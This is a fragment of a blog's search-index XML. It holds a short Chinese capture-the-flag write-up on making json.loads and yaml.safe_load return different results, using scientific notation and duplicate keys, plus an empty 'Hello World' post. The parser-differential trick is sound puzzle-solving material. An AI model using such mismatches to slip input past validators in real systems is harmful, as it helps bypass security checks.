    <title>yaml vs json</title>
    <link href="/2023/11/13/yaml%20vs%20json/"/>
    <url>/2023/11/13/yaml%20vs%20json/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/postimg/1/1-1.png" alt="image.png"><br>要求注释已经写的很明显了,所以需要考验我们的搜索能力了<br>如何找到一个字符串可以被json.loads()和yaml.safe_load()同时读取并且得到不同的结果<br>浅浅搜索一下就可以知道,json跟yaml几乎是一个东西的不同表现形式<br>只是yaml的可读性更强,想让他们解析出不同的结果,首先是输入的字符串一定是json格式<br>在我尝试时发现,如果用json格式作为输入基本上字符串都会被加上引号,所以我开始寻找数字,比如科学计数法中json格式会保留,而转为yaml时却会解析为整数格式,{“a”:1e1}会解析为a:10,这样我就拿到了第一个flag<br>json格式的规范是什么呢,由<a href="https://www.ecma-international.org/publications-and-standards/standards/ecma-404/">ecma-404</a>和<a href="https://www.rfc-editor.org/rfc/rfc8259">rfc 8259</a>定义(由wp提供),其中对于相同键值描述与<a href="https://yaml.org/spec/1.2.2/">yaml1.2</a>不太相同,在yaml1.2中键值相同会报错但是yaml1.0中就不会,并且json也不会,so我侥幸拿到了第二个flag,至于为什么我想到了这个,是因为<br><img src="/img/postimg/1/1-2.png" alt="image.png"><br>其中我看到第四条给的灵感</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/11/13/hello-world/"/>
    <url>/2023/11/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>me</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
